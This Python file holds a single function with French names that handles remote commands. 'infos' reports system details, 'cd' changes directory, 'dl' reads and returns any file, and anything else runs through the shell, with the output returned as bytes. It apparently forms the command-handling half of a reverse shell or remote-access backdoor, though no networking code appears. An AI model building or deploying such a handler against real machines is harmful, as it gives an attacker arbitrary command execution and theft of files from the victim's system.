import os
import subprocess
import platform


def commande_use(commande):
    # reponse = " "
    commande_split = commande.split(" ")
    while True:
        if commande == "exit":
            reponse = ""
        elif commande == "infos":
            reponse = platform.platform() + " " + os.getcwd() + " > "
        elif len(commande_split) == 2 and commande_split[0] == "cd":
            try:
                os.chdir(commande_split[1].strip("'"))
                reponse = " "
            except FileNotFoundError:
                reponse = "ERREUR : ce répertoire n'exite pas"
        elif len(commande_split) == 2 and commande_split[0] == "dl":
            try:
                file = open(commande_split[1], "rb")
            except FileNotFoundError:
                reponse = " "
            else:
                reponse = file.read()
                reponse = reponse.decode()
                file.close()
        else:
            result = subprocess.run(commande, shell=True, capture_output=True,
                                    universal_newlines=True)  # dir sur PC
            reponse = result.stdout + result.stderr
            if not reponse or len(reponse) == 0:
                reponse = " "
        return reponse.encode()
